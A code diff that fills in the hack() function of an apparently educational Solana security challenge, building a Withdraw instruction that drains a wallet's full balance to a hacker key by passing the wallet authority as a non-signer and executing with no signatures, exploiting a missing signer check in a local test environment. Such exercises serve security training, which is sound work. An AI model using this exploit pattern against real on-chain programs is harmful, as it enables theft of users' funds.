@@ -9,6 +9,9 @@ use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+// need to pull these in
+use solana_program::instruction::{AccountMeta, Instruction};
+use borsh::{BorshSerialize};
 
 struct Challenge {
     hacker: Keypair,
@@ -18,7 +21,25 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    let amount:u64 = _env.get_account(_challenge.wallet_address).unwrap().lamports;
+
+    let withdraw_instruction = Instruction {
+        program_id: _challenge.wallet_program,
+        accounts: vec![
+            AccountMeta::new(_challenge.wallet_address, false),
+            AccountMeta::new(_challenge.wallet_authority, false), // set this to false
+            AccountMeta::new(_challenge.hacker.pubkey(), false),
+            AccountMeta::new_readonly(system_program::id(), false),
+        ],
+        data: level1::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+    };
+    let tx = _env.execute_as_transaction(
+        &[withdraw_instruction],
+        &[], // "unnecessary signature" if we let hacker sign. alternatively can set sign=true on third field
+    );
+    tx.print_named("Hack: hacker withdraw");
+}
 
 /*
 SETUP CODE BELOW
